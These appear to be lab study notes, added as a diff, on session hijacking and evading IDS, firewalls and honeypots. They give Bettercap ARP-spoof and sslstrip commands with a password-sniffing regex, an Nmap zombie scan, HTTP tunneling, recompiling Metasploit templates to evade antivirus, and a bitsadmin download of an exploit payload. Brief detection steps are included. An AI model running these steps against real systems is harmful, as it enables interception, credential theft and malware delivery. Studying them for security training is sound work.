@@ -1,0 +1,94 @@
+Session Hijacking
+
+1. OWASP ZAP
+
+in target machine, set proxy to attacker machine
+settings --> systems --> proxy settings --> proxy server setup --> on, IP and port 8080.
+
+in zap, + --> Break --> Settings --> Local Proxies
+
+2. Bettercap
+
+bettercap -iface eth0
+net.probe on
+net.recon on
+http.proxy on
+set http.proxy.sslstrip true
+set arp.spoof.targets <<Target IP>>
+set arp.spoof.internal true
+arp.spoof on
+net.sniff on
+net.sniff.regexp ‘.*password=.+’ 
+
+3.Hetty
+
+Manage Projects --> Create & Open Project --> Proxy Logs
+
+
+Detect:
+1. Wireshark
+bettercap -iface eth0
+net.probe on
+net.recon on
+multiple ARP Packets are captured. 
+#In Info column, who has will come, the tell IP Address is attacker's IP Address.
+
+
+Evading IDS Firewalls And Honeypots
+
+1. Detect
+
+i. Snort - Intrusion Detection.
+ii. ZoneAlarm Free Firewall - Firewall
+Firwall --> View Zones --> Add (Hostname or ip to block)
+
+iii. Honeybot - Malicious Network Traffic
+telnet <<IP of machine which has HoneyBot>> --> Request recorded in HoneyBot--> Right Click --> View Details.
+
+
+2. Bypass
+
+i. Nmap:
+In target machine , Inbound rule --> Custom --> Add remote attacker IP Address --> Block The Connection.
+Attacker machine:
+nmap -sI <<Other IP From Network>> <<Target IP Address>> #Zombie Scan.
+
+ii. HTTHOST, HTTPORT - HTTP/FTP Tunneling.
+Use 3 machines 
+Proxy machine :
+Ensure World Wide Web Publishing Service And IIS Admin Service Is Not Running
+Download HTTHOST --> Set Port(80 or 90), Password, Check Revalidate DNS Names ,Log Connections.
+
+Attacker machine 
+Outbound rule --> Port(OK To All) --> After creating go to properties --> Ports and Protocols --> Remote Port 21.
+HTTPort--> IP Of HTTHOST Machine, Password, Remote Host --> Port Mapping, New Mapping Edit --> Local Port 21, Host Target IP , Remote Port 21 --> Start.
+In CMD --> ftp 127.0.0.1
+
+iii. Metasploit Templates
+Create msfvenom file
+pluma /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c and change payload size to 4000.
+i686.w64-mingw32-gcc template.c -lws2_32 -o evasion.exe.  #recompile file.
+msfvenom command and add -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe  #generate new template.
+Upload In VirusTotal.
+
+
+ii. Bitsadmin
+
+Create msfvenom file
+Share Folder
+Keep Firewall On
+bitsadmin /transfer Exploit.exe http://ipaddress/share/Exploit.exe C:\Exploit.exe
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
